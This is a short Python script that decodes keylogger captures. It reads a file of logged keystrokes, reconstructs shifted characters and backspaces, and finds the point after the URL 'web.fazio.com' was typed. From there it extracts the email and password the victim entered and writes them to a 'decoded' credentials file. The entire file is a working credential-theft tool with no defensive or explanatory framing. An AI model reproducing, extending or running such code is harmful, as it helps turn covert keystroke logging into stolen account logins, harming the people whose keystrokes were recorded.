from re import sub
from string import find, ascii_lowercase, ascii_uppercase

# constants
ALPHA_KEYS = list(ascii_lowercase)
ALPHA_SHIFT_KEYS = list(ascii_uppercase)
NUMERIC_KEYS = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
NUMERIC_SHIFT_KEYS = [")", "!", "@", "#", "$", "%", "^", "&", "*", "("]
SYMBOL_KEYS = ["-", "=", "`", "[", "]", ";", "'", "\\", ",", ".", "/"]
SYMBOL_SHIFT_KEYS = ["_", "+", "~", "{", "}", ":", "\"", "|", "<", ">", "?"]
ARROW_KEYS = ["[uparrow]", "[downarrow]", "[leftarrow]", "[rightarrow]"]
FUNC_KEYS = ["[esc]", "[shift]", "[backspace]", "[control]", "[enter]", "[tab]", "[capslock]", "[space]"]
NON_SHIFT_KEYS = ALPHA_KEYS + NUMERIC_KEYS + SYMBOL_KEYS
SHIFT_KEYS = ALPHA_SHIFT_KEYS + NUMERIC_SHIFT_KEYS + SYMBOL_SHIFT_KEYS
SUB_KEYS = NON_SHIFT_KEYS + SHIFT_KEYS
KEYS = SUB_KEYS + ARROW_KEYS + FUNC_KEYS

# global
url = "web.fazio.com"

# remove inserted backspaces
def remove_backspace(text):
  return(sub(".\[backspace\]", "", text))

# convert shifted keys
def shift(text):
  new = ""
  for n in range(7, len(text)):
    if text[n-7:n] == "[shift]":
      new = new[:-7]
      index = NON_SHIFT_KEYS.index(text[n])
      new += SHIFT_KEYS[index]
    else:
      new += text[n]
  return new

# find email and password
def search(text):
  new = text[text.find(url + "[enter]")+len(url + "[enter]"):]
  email = new[:new.find("[tab]")]
  pswd = new[new.find("[tab]")+len("[tab]"):new.find("[enter]")]
  return([email, pswd])

def main():
  f1 = open("logs.txt", "r")
  creds = search(remove_backspace(shift(f1.read())))
  f1.close()

  f2 = open("logs_decoded.txt", "a+")
  f2.write("username: " + creds[0] + "\r\n")
  f2.write("password: " + creds[1] + "\r\n")
  f2.close()

if __name__ == "__main__":
  main()